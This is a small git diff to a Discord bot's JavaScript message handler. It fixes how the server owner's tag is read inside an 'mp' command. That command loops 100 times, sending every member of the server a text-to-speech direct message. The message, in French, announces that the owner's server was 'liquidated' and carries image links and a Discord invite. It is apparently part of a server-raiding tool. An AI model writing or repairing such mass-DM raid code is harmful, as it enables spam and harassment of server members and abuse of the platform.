@@ -75,7 +75,7 @@ bot.on("message", msg => {
 			  					}
 									  if(msg.content === prefix+"mp"){
 										  for(var i = 0; i < 100; i++){
-											  msg.guild.members.map(m => m.send(`${msg.guild.owner.tag.user.tag} s'est fait liquidé son serv \nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif https://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/vDZ64C3`,{tts:true}))
+											  msg.guild.members.map(m => m.send(`${msg.guild.owner.user.tag} s'est fait liquidé son serv \nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif https://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/vDZ64C3`,{tts:true}))
 										  }
 									  }
 			  							if(msg.content === prefix+"botstats"){
